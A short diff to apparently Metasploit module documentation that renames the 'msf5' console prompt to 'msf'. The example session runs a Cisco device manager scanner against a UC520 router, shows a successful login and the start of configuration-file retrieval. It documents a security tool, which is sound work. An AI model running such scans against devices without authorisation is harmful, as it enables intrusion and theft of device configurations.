@@ -29,12 +29,12 @@
 ### Tested on Cisco UC520-8U-4FXO-K9 running IOS 12.4
 
   ```
-  msf5 > use auxiliary/scanner/http/cisco_device_manager 
-  msf5 auxiliary(scanner/http/cisco_device_manager) > set rhosts 2.2.2.2
+  msf > use auxiliary/scanner/http/cisco_device_manager 
+  msf auxiliary(scanner/http/cisco_device_manager) > set rhosts 2.2.2.2
   rhosts => 2.2.2.2
-  msf5 auxiliary(scanner/http/cisco_device_manager) > set vebose true
+  msf auxiliary(scanner/http/cisco_device_manager) > set vebose true
   vebose => true
-  msf5 auxiliary(scanner/http/cisco_device_manager) > run
+  msf auxiliary(scanner/http/cisco_device_manager) > run
   
   [+] 2.2.2.2:80 Successfully authenticated to this device
   [+] 2.2.2.2:80 Processing the configuration file...
